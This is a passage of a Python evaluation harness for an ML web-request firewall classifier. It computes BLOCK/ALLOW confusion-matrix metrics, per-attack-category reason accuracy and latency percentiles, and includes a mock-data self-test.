# ══════════════════════════════════════════════════════════════════════════

CLEAN_EVAL = os.path.expanduser("~/Desktop/firewall-IA/datasets/v4_clean/eval.jsonl")
MANIFEST = os.path.expanduser("~/Desktop/firewall-IA/datasets/manifest_v4_clean.json")

# Positive class for all binary metrics. BLOCK is positive because the
# security question is "did we catch the attack?". Never switch this silently.
POSITIVE_CLASS = "BLOCK"

# A category needs at least this much held-out support before its per-category
# numbers are presented as anything but exploratory. Not a quality threshold —
# a reporting-honesty threshold.
MIN_EVAL_SUPPORT = 30


# ── Dataset label parsing ──────────────────────────────────────────────────
# parse_prediction() and normalize_reason() are the shared contract and live
# in inference_core.py. split_output() parses DATASET labels, which is an
# evaluation concern only, so it stays here.
def split_output(output):
    """Split a dataset label 'DECISION | reason' into its two parts."""
    decision, _, reason = output.partition("|")
    return decision.strip().upper(), reason.strip()


# ── Level 1: binary security decision ──────────────────────────────────────
def score_binary(records):
    """records: iterable of dicts with keys expected, predicted, status.

    BLOCK is the positive class.
      TP  expected BLOCK, predicted BLOCK   (attack caught)
      FN  expected BLOCK, predicted ALLOW   (attack missed - most serious)
      FP  expected ALLOW, predicted BLOCK   (benign traffic broken)
      TN  expected ALLOW, predicted ALLOW

    INVALID-OUTPUT POLICY (frozen): an unparseable output is counted as an
    incorrect security decision and is mapped to the OPPOSITE of the expected
    decision, so it can never earn credit. It is additionally reported as a
    separate invalid-output rate, and a parseable-only view is emitted
    alongside so the effect of the mapping is always visible.

    NOTE: D4 specifies FAIL-CLOSED runtime behaviour (an unusable classifier
    response blocks traffic). That is an operational control, NOT evaluation
    credit; a model that emits garbage is not detecting anything. The two
    concerns are deliberately kept separate.
    """
    cm = {"TP": 0, "FP": 0, "FN": 0, "TN": 0}
    cm_valid = {"TP": 0, "FP": 0, "FN": 0, "TN": 0}
    invalid = 0
    for r in records:
        exp = r["expected"]
        if r["status"] == "invalid":
            invalid += 1
            pred = "ALLOW" if exp == "BLOCK" else "BLOCK"
            target = cm
        else:
            pred = r["predicted"]
            target = None
        for d in ((cm,) if target is cm else (cm, cm_valid)):
            if exp == "BLOCK" and pred == "BLOCK":
                d["TP"] += 1
            elif exp == "BLOCK" and pred == "ALLOW":
                d["FN"] += 1
            elif exp == "ALLOW" and pred == "BLOCK":
                d["FP"] += 1
            else:
                d["TN"] += 1

    def derive(c, n_total):
        tp, fp, fn, tn = c["TP"], c["FP"], c["FN"], c["TN"]
        n = tp + fp + fn + tn
        prec = tp / (tp + fp) if (tp + fp) else None
        rec = tp / (tp + fn) if (tp + fn) else None
        f1 = (2 * prec * rec / (prec + rec)) if (prec and rec) else None
        return {
            "support": n,
            "correct": tp + tn,
            "accuracy": (tp + tn) / n if n else None,
            "precision_block": prec,
            "recall_block": rec,
            "f1_block": f1,
            "attack_detection_rate": rec,      # == recall on the positive class
            "false_positives": fp,
            "false_positive_rate": fp / (fp + tn) if (fp + tn) else None,
            "false_negatives": fn,
            "false_negative_rate": fn / (tp + fn) if (tp + fn) else None,
            "confusion_matrix": dict(c),
            "allow_support": fp + tn,
            "block_support": tp + fn,
        }

    total = cm["TP"] + cm["FP"] + cm["FN"] + cm["TN"]
    out = derive(cm, total)
    out["invalid_outputs"] = invalid
    out["invalid_output_rate"] = invalid / total if total else None
    out["parseable_only"] = derive(cm_valid, total - invalid)
    return out


# ── Level 2: attack category / reason ──────────────────────────────────────
def score_categories(records, insufficient_reasons, all_expected_reasons):
    """Per-category metrics over expected-BLOCK examples.

    CRITICAL SEPARATION: a category mismatch NEVER reduces binary recall.
    'BLOCK | SQL injection' predicted for an expected 'BLOCK | XSS' is:
        binary decision  = CORRECT
        category/reason  = INCORRECT
    Reason accuracy is measured ONLY over correctly-blocked attacks, so the two
    dimensions cannot contaminate each other.
    """
    per = {}
    for reason in all_expected_reasons:
        per[reason] = {"support": 0, "blocked_correct": 0,
                       "reason_correct": 0, "invalid": 0}
    for r in records:
        if r["expected"] != "BLOCK":
            continue
        reason = r["expected_reason"]
        e = per.setdefault(reason, {"support": 0, "blocked_correct": 0,
                                    "reason_correct": 0, "invalid": 0})
        e["support"] += 1
        if r["status"] == "invalid":
            e["invalid"] += 1
            continue
        if r["predicted"] == "BLOCK":
            e["blocked_correct"] += 1
            if normalize_reason(r["predicted_reason"]) == normalize_reason(reason):
                e["reason_correct"] += 1

    out = {}
    for reason, e in per.items():
        sup, bc = e["support"], e["blocked_correct"]
        if sup == 0:
            status = "NOT EVALUABLE"
        elif reason in insufficient_reasons or sup < MIN_EVAL_SUPPORT:
            status = "INSUFFICIENT DATA"
        else:
            status = "OK"
        out[reason] = {
            "support": sup,
            "binary_recall_num": bc,
            "binary_recall_den": sup,
            "binary_recall": (bc / sup) if sup else None,
            "reason_accuracy_num": e["reason_correct"],
            "reason_accuracy_den": bc,
            "reason_accuracy": (e["reason_correct"] / bc) if bc else None,
            "invalid_outputs": e["invalid"],
            "evidence_status": status,
        }
    return out


# ── Level 3: latency ───────────────────────────────────────────────────────
def percentile(sorted_vals, q):
    """Nearest-rank percentile. q in [0,1]."""
    if not sorted_vals:
        return None
    import math
    k = max(1, math.ceil(q * len(sorted_vals)))
    return sorted_vals[min(k, len(sorted_vals)) - 1]


def latency_stats(samples_ms):
    """Model-side inference latency ONLY.

    This is NOT end-to-end gateway latency. The D3 target of P95 <= 200 ms is
    an END-TO-END budget covering proxy + API + model; a model-only number
    cannot be compared against it directly.
    """
    if not samples_ms:
        return {"count": 0}
    s = sorted(samples_ms)
    return {
        "count": len(s),
        "scope": "model-side inference only (NOT end-to-end gateway latency)",
        "mean_ms": statistics.mean(s),
        "p50_ms": percentile(s, 0.50),
        "p95_ms": percentile(s, 0.95),
        "p99_ms": percentile(s, 0.99),
        "min_ms": s[0],
        "max_ms": s[-1],
        "stdev_ms": statistics.stdev(s) if len(s) > 1 else 0.0,
    }


# ── Dataset / manifest helpers ─────────────────────────────────────────────
def load_manifest_flags():
    """Derive insufficient-data and not-evaluable reason strings from the
    dataset manifest, mapped through the generator's own category tables so the
    two never drift apart."""
    insufficient, not_evaluable, manifest_meta = set(), set(), {}
    try:
        with open(MANIFEST) as f:
            man = json.load(f)
        manifest_meta = {
            "version": man.get("version"),
            "generated_utc": man.get("generated_utc"),
            "cap_per_category": man.get("cap_per_category"),
            "row_cap_per_category": man.get("row_cap_per_category"),
            "artifact_sha256": man.get("artifact_sha256"),
        }
        not_evaluable = {k.partition("|")[2].strip()
                         for k in man.get("not_evaluable_categories", {})}
        try:
            import parse_dataset_v4 as gen
            name_to_reason = {c: v[0] for c, v in gen.CATEGORY_SHAPES.items()}
            name_to_reason.update({c: v[0] for c, v in gen.HARDCODED_SHAPES.items()})
        except Exception:
            name_to_reason = {}
        for cat in man.get("insufficient_data_categories", {}):
            if cat in name_to_reason:
                insufficient.add(name_to_reason[cat])
    except FileNotFoundError:
        pass
    return insufficient, not_evaluable, manifest_meta


def git_commit():
    try:
        import subprocess
        r = subprocess.run(["git", "-C", os.path.dirname(os.path.abspath(__file__)),
                            "rev-parse", "HEAD"], capture_output=True, text=True, timeout=10)
        return r.stdout.strip() if r.returncode == 0 else "<unavailable>"
    except Exception:
        return "<unavailable>"


def sha256_file(path):
    import hashlib
    h = hashlib.sha256()
    with open(path, "rb") as f:
        for c in iter(lambda: f.read(1 << 20), b""):
            h.update(c)
    return h.hexdigest()


# ── Reporting ──────────────────────────────────────────────────────────────
def pct(x):
    return "n/a" if x is None else f"{100 * x:.2f}%"


def print_report(result):
    m = result["run_metadata"]
    print("\n" + "=" * 78)
    print("firewall-IA — V4 EVALUATION (frozen methodology, E5)")
    print("=" * 78)
    for k in ("date_utc", "git_commit", "mode", "adapter_dir", "dataset",
              "dataset_sha256", "manifest_version"):
        if m.get(k) is not None:
            print(f"  {k:<18}: {m[k]}")

    b = result["binary"]
    print("\n" + "=" * 78)
    print("LEVEL 1 — BINARY SECURITY DECISION   (positive class = BLOCK)")
    print("=" * 78)
    print(f"  support                  : {b['support']:,}"
          f"   (BLOCK {b['block_support']:,} / ALLOW {b['allow_support']:,})")
    print(f"  correct                  : {b['correct']:,}")
    print(f"  accuracy                 : {pct(b['accuracy'])}")
    print(f"  precision (BLOCK)        : {pct(b['precision_block'])}")
    print(f"  recall (BLOCK)           : {pct(b['recall_block'])}")
    print(f"  F1 (BLOCK)               : {pct(b['f1_block'])}")
    print(f"  attack detection rate    : {pct(b['attack_detection_rate'])}  (= recall)")
    print(f"  false positives          : {b['false_positives']:,}")
    print(f"  false positive rate      : {pct(b['false_positive_rate'])}"
          f"   [FP / (FP+TN), benign traffic wrongly blocked]")
    print(f"  false negatives          : {b['false_negatives']:,}")
    print(f"  false negative rate      : {pct(b['false_negative_rate'])}"
          f"   [FN / (TP+FN), attacks missed]")
    print(f"  invalid outputs          : {b['invalid_outputs']:,}"
          f"   ({pct(b['invalid_output_rate'])})")
    c = b["confusion_matrix"]
    print("\n  confusion matrix (rows = expected, cols = predicted)")
    print(f"                 pred BLOCK   pred ALLOW")
    print(f"    exp BLOCK    {c['TP']:>10,}   {c['FN']:>10,}")
    print(f"    exp ALLOW    {c['FP']:>10,}   {c['TN']:>10,}")
    pv = b["parseable_only"]
    print(f"\n  parseable-only view (excludes {b['invalid_outputs']:,} invalid): "
          f"support {pv['support']:,}, accuracy {pct(pv['accuracy'])}, "
          f"recall {pct(pv['recall_block'])}, FPR {pct(pv['false_positive_rate'])}")

    print("\n" + "=" * 78)
    print("LEVEL 2 — ATTACK CATEGORY / REASON")
    print("=" * 78)
    print("  Measured ONLY over correctly-blocked attacks. A category mismatch")
    print("  is NOT a binary security failure and never reduces recall above.")
    print()
    print(f"  {'CATEGORY':<44}{'SUP':>6}{'BINARY RECALL':>18}{'REASON ACC':>18}  STATUS")
    print("  " + "-" * 104)
    cats = result["categories"]
    for reason in sorted(cats, key=lambda r: (-cats[r]["support"], r)):
        e = cats[reason]
        br = f"{e['binary_recall_num']}/{e['binary_recall_den']}"
        ra = f"{e['reason_accuracy_num']}/{e['reason_accuracy_den']}"
        brp = f"({pct(e['binary_recall'])})" if e["binary_recall"] is not None else "(n/a)"
        rap = f"({pct(e['reason_accuracy'])})" if e["reason_accuracy"] is not None else "(n/a)"
        print(f"  {reason[:43]:<44}{e['support']:>6}{br:>9}{brp:>9}"
              f"{ra:>9}{rap:>9}  {e['evidence_status']}")
    print("  " + "-" * 104)
    ne = [r for r in cats if cats[r]["evidence_status"] == "NOT EVALUABLE"]
    ins = [r for r in cats if cats[r]["evidence_status"] == "INSUFFICIENT DATA"]
    if ne:
        print(f"\n  NOT EVALUABLE ({len(ne)}) — zero held-out support, no claim may be made:")
        for r in sorted(ne):
            print(f"    - {r}")
    if ins:
        print(f"\n  INSUFFICIENT DATA ({len(ins)}) — exploratory only, not a robust")
        print("  category-level conclusion (D18):")
        for r in sorted(ins, key=lambda r: cats[r]["support"]):
            print(f"    - {r}  (support {cats[r]['support']})")

    lat = result.get("latency") or {}
    if lat.get("count"):
        print("\n" + "=" * 78)
        print("LEVEL 3 — LATENCY")
        print("=" * 78)
        print(f"  scope   : {lat['scope']}")
        print(f"  count   : {lat['count']:,}")
        for k in ("mean_ms", "p50_ms", "p95_ms", "p99_ms", "min_ms", "max_ms", "stdev_ms"):
            print(f"  {k:<8}: {lat[k]:>9.1f} ms")
        print("\n  NOTE: D3's P95 <= 200 ms target is an END-TO-END budget")
        print("  (proxy + API + model). These model-only numbers are not")
        print("  comparable to it.")

    print("\n" + "=" * 78)
    print("No conclusions are generated automatically. Interpret with the")
    print("evidence-status column and reports/e5_evaluation_methodology.txt.")
    print("=" * 78)


# ── Evaluation drivers ─────────────────────────────────────────────────────
def evaluate_dataset(args):
    insufficient, not_evaluable, man_meta = load_manifest_flags()
    rows = [json.loads(l) for l in open(args.dataset) if l.strip()]
    if args.limit:
        rows = rows[: args.limit]
    all_reasons = {split_output(r["output"])[1] for r in rows
                   if split_output(r["output"])[0] == "BLOCK"} | not_evaluable

    tok, mdl = load_model(args.adapter)
    device = resolve_device()

    records, lat = [], []
    for i, r in enumerate(rows, 1):
        exp_dec, exp_reason = split_output(r["output"])
        raw, dt = classify_raw(tok, mdl, r["input"], device)
        lat.append(dt)
        dec, reason, status = parse_prediction(raw)
        records.append({"expected": exp_dec, "expected_reason": exp_reason,
                        "predicted": dec, "predicted_reason": reason,
                        "status": status, "raw": raw})
        if i % 250 == 0:
            print(f"  {i}/{len(rows)} ...", flush=True)

    return {
        "run_metadata": {
            "date_utc": datetime.now(timezone.utc).isoformat(timespec="seconds"),
            "git_commit": git_commit(),
            "mode": "dataset",
            "adapter_dir": args.adapter,
            "dataset": args.dataset,
            "dataset_sha256": sha256_file(args.dataset),
            "manifest_version": man_meta.get("version"),
            "manifest": man_meta,
            "positive_class": POSITIVE_CLASS,
            "methodology": "reports/e5_evaluation_methodology.txt",
        },
        "binary": score_binary(records),
        "categories": score_categories(records, insufficient, all_reasons),
        "latency": latency_stats(lat),
    }


def evaluate_manual(args):
    """LEGACY MANUAL DIAGNOSTIC / REGRESSION SUITE.

    NOT the primary V4 metric. 135 hand-authored cases, 109 BLOCK / 26 ALLOW,
    5 per category, with an adversarial block whose transform families overlap
    training augmentation. Useful for edge cases and regression checks only.
    """
    print("=" * 78)
    print("LEGACY MANUAL DIAGNOSTIC / REGRESSION SUITE — NOT the primary metric")
    print("  135 cases, 109 BLOCK / 26 ALLOW. An always-BLOCK classifier scores")
    print("  80.7%. The 26 ALLOW cases cannot support an FPR claim. The")
    print("  adversarial cases reuse transform families seen in training and")
    print("  are NOT evidence of evasion resistance.")
    print("=" * 78)
    tok, mdl = load_model(args.adapter)
    device = resolve_device()
    records, lat, per_cat = [], [], defaultdict(lambda: {"n": 0, "ok": 0})
    for request, expected, category, desc in ALL_CASES:
        raw, dt = classify_raw(tok, mdl, request, device)
        lat.append(dt)
        dec, reason, status = parse_prediction(raw)
        records.append({"expected": expected, "expected_reason": category,
                        "predicted": dec, "predicted_reason": reason,
                        "status": status, "raw": raw})
        per_cat[category]["n"] += 1
        if status == "ok" and dec == expected:
            per_cat[category]["ok"] += 1
    res = {
        "run_metadata": {
            "date_utc": datetime.now(timezone.utc).isoformat(timespec="seconds"),
            "git_commit": git_commit(), "mode": "manual-suite",
            "adapter_dir": args.adapter,
            "dataset": "legacy 135-case manual diagnostic suite",
            "positive_class": POSITIVE_CLASS,
            "warning": "diagnostic only — not the primary V4 metric",
        },
        "binary": score_binary(records),
        "categories": {},
        "latency": latency_stats(lat),
        "manual_per_case_category": {k: dict(v) for k, v in per_cat.items()},
    }
    return res


# ── Self-test (no model required) ──────────────────────────────────────────
def self_test(args):
    """Structural verification of the metric code on controlled fixtures.

    Mock predictions ONLY. Nothing here is a model result.
    """
    ok = True

    def check(name, got, want):
        nonlocal ok
        good = got == want
        ok &= good
        print(f"  [{'PASS' if good else 'FAIL'}] {name:<52} got={got!r}"
              + ("" if good else f" want={want!r}"))

    print("=" * 78)
    print("E5 SELF-TEST — mock predictions, NOT model results")
    print("=" * 78)

    print("\n-- parser --")
    for text, want in [
        ("ALLOW | Normal HTTP request with no attack patterns detected.",
         ("ALLOW", "Normal HTTP request with no attack patterns detected", "ok")),
        ("BLOCK | SQL injection payload detected.", ("BLOCK", "SQL injection payload detected", "ok")),
        ("  BLOCK |   Path traversal attack detected.  ", ("BLOCK", "Path traversal attack detected", "ok")),
        ("BLOCK | XSS detected. trailing rambling", ("BLOCK", "XSS detected", "ok")),
        ("BLOCK | no period here", ("BLOCK", "no period here", "ok")),
        ("total garbage, no contract", (None, None, "invalid")),
        ("", (None, None, "invalid")),
        (None, (None, None, "invalid")),
    ]:
        check(f"parse {text!r}"[:60], parse_prediction(text), want)

    print("\n-- reason normalisation --")
    check("case/space/period invariance",
          normalize_reason("  SQL Injection   Payload Detected. ") == normalize_reason("sql injection payload detected"),
          True)
    check("distinct reasons stay distinct",
          normalize_reason("SQL injection payload detected.") == normalize_reason("Cross-site scripting payload detected."),
          False)

    print("\n-- confusion matrix (2 TP, 1 FN, 1 FP, 3 TN) --")
    recs = (
        [{"expected": "BLOCK", "predicted": "BLOCK", "status": "ok",
          "expected_reason": "SQL injection payload detected.",
          "predicted_reason": "SQL injection payload detected."} for _ in range(2)]
        + [{"expected": "BLOCK", "predicted": "ALLOW", "status": "ok",
            "expected_reason": "SQL injection payload detected.", "predicted_reason": "x"}]
        + [{"expected": "ALLOW", "predicted": "BLOCK", "status": "ok",
            "expected_reason": "", "predicted_reason": "y"}]
        + [{"expected": "ALLOW", "predicted": "ALLOW", "status": "ok",
            "expected_reason": "", "predicted_reason": "z"} for _ in range(3)]
    )
    b = score_binary(recs)
    check("confusion matrix", b["confusion_matrix"], {"TP": 2, "FP": 1, "FN": 1, "TN": 3})
    check("support", b["support"], 7)
    check("accuracy 5/7", round(b["accuracy"], 6), round(5 / 7, 6))
    check("precision 2/3", round(b["precision_block"], 6), round(2 / 3, 6))
    check("recall 2/3", round(b["recall_block"], 6), round(2 / 3, 6))
    check("F1 2/3", round(b["f1_block"], 6), round(2 / 3, 6))
    check("FPR 1/4", b["false_positive_rate"], 0.25)
    check("FNR 1/3", round(b["false_negative_rate"], 6), round(1 / 3, 6))
    check("attack detection rate == recall", b["attack_detection_rate"], b["recall_block"])

    print("\n-- invalid-output policy --")
    inv = [{"expected": "BLOCK", "predicted": None, "status": "invalid",
            "expected_reason": "SQL injection payload detected.", "predicted_reason": None},
           {"expected": "ALLOW", "predicted": None, "status": "invalid",
            "expected_reason": "", "predicted_reason": None}]
    b2 = score_binary(recs + inv)
    check("invalid counted", b2["invalid_outputs"], 2)
    check("invalid rate 2/9", round(b2["invalid_output_rate"], 6), round(2 / 9, 6))
    check("invalid BLOCK -> FN", b2["confusion_matrix"]["FN"], 2)
    check("invalid ALLOW -> FP", b2["confusion_matrix"]["FP"], 2)
    check("invalid never earns credit", b2["correct"], 5)
    check("parseable-only unaffected", b2["parseable_only"]["confusion_matrix"],
          {"TP": 2, "FP": 1, "FN": 1, "TN": 3})

    print("\n-- category scoring: mismatch must NOT hurt binary recall --")
    crecs = [
        {"expected": "BLOCK", "predicted": "BLOCK", "status": "ok",
         "expected_reason": "SQL injection payload detected.",
         "predicted_reason": "SQL injection payload detected."},
        {"expected": "BLOCK", "predicted": "BLOCK", "status": "ok",
         "expected_reason": "SQL injection payload detected.",
         "predicted_reason": "Cross-site scripting payload detected."},
        {"expected": "BLOCK", "predicted": "ALLOW", "status": "ok",
         "expected_reason": "SQL injection payload detected.", "predicted_reason": "n"},
    ]
    cats = score_categories(crecs, set(), {"SQL injection payload detected."})
    e = cats["SQL injection payload detected."]
    check("support 3", e["support"], 3)
    check("binary recall 2/3 (mismatch still blocked)",
          (e["binary_recall_num"], e["binary_recall_den"]), (2, 3))
    check("reason accuracy 1/2 (over blocked only)",
          (e["reason_accuracy_num"], e["reason_accuracy_den"]), (1, 2))

    print("\n-- evidence status --")
    cats2 = score_categories(crecs, {"SQL injection payload detected."},
                             {"SQL injection payload detected.",
                              "HTTP request smuggling attack detected."})
    check("zero support -> NOT EVALUABLE",
          cats2["HTTP request smuggling attack detected."]["evidence_status"], "NOT EVALUABLE")
    check("flagged category -> INSUFFICIENT DATA",
          cats2["SQL injection payload detected."]["evidence_status"], "INSUFFICIENT DATA")

    print("\n-- percentiles (1..100) --")
    vals = list(range(1, 101))
    check("p50", percentile(vals, 0.50), 50)
    check("p95", percentile(vals, 0.95), 95)
    check("p99", percentile(vals, 0.99), 99)
    ls = latency_stats([float(v) for v in vals])
    check("count", ls["count"], 100)
    check("min", ls["min_ms"], 1.0)
    check("max", ls["max_ms"], 100.0)
    check("mean", ls["mean_ms"], 50.5)
    check("single sample stdev 0", latency_stats([5.0])["stdev_ms"], 0.0)
    check("empty latency", latency_stats([]), {"count": 0})

    print("\n-- live dataset structural checks --")
    try:
        rows = [json.loads(l) for l in open(CLEAN_EVAL) if l.strip()]
        check("eval.jsonl loads", len(rows) > 0, True)
        exp = [split_output(r["output"]) for r in rows]
        check("every label parses as DECISION | reason",
              all(d in ("ALLOW", "BLOCK") and rr for d, rr in exp), True)
        sup = Counter(rr for d, rr in exp if d == "BLOCK")
        insufficient, not_evaluable, _ = load_manifest_flags()
        print(f"       eval rows={len(rows)}  BLOCK categories={len(sup)}  "
              f"ALLOW={sum(1 for d, _ in exp if d == 'ALLOW')}")
        check("Request Smuggling absent from eval",
              "HTTP request smuggling attack detected." in sup, False)
        check("manifest flags Request Smuggling NOT EVALUABLE",
              "HTTP request smuggling attack detected." in not_evaluable, True)
        mock = [{"expected": d, "expected_reason": rr, "predicted": d,
                 "predicted_reason": rr, "status": "ok"} for d, rr in exp]
        cats3 = score_categories(mock, insufficient, set(sup) | not_evaluable)
        check("category supports match dataset",
              {k: v["support"] for k, v in cats3.items() if v["support"]}, dict(sup))
        check("Request Smuggling -> NOT EVALUABLE",
              cats3["HTTP request smuggling attack detected."]["evidence_status"],
              "NOT EVALUABLE")
        flagged = sorted(k for k, v in cats3.items()
                         if v["evidence_status"] == "INSUFFICIENT DATA")
        print(f"       INSUFFICIENT DATA categories flagged: {len(flagged)}")
        for k in flagged:
            print(f"         - {k} (support {cats3[k]['support']})")
        b3 = score_binary(mock)
        check("perfect mock -> accuracy 1.0", b3["accuracy"], 1.0)
        check("perfect mock -> 0 FP", b3["false_positives"], 0)
        check("perfect mock -> 0 FN", b3["false_negatives"], 0)
    except FileNotFoundError:
        print("  [SKIP] datasets/v4_clean/eval.jsonl not found")

    print("\n" + "=" * 78)
    print(f"SELF-TEST: {'PASS' if ok else 'FAIL'}   (mock data only — not model results)")
    print("=" * 78)
    return 0 if ok else 1


# ── CLI ────────────────────────────────────────────────────────────────────
def main():
    ap = argparse.ArgumentParser(
        description="firewall-IA V4 evaluation (frozen methodology, E5)")
    ap.add_argument("--mode", choices=["dataset", "manual", "self-test"],
                    default="dataset",
                    help="dataset = primary held-out eval (default); "
                         "manual = legacy 135-case diagnostic suite; "
                         "self-test = verify metric code, no model needed")
    ap.add_argument("--dataset", default=CLEAN_EVAL)
    ap.add_argument("--adapter", default=ADAPTER_DIR)
    ap.add_argument("--limit", type=int, default=0,
                    help="evaluate only the first N rows (smoke runs)")
    ap.add_argument("--json", default=None, help="write machine-readable results here")
    args = ap.parse_args()

    if args.mode == "self-test":
        return self_test(args)

    if not os.path.isdir(args.adapter):
        print(f"FATAL: adapter not found: {args.adapter}\n"
              f"V4 has not been trained yet. Use --mode self-test to verify the\n"
              f"evaluation code without a model.")
        return 3

    result = evaluate_dataset(args) if args.mode == "dataset" else evaluate_manual(args)
    print_report(result)
    if args.json:
        os.makedirs(os.path.dirname(os.path.abspath(args.json)), exist_ok=True)
        with open(args.json, "w") as f:
            json.dump(result, f, indent=2)
        print(f"\nmachine-readable results -> {args.json}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
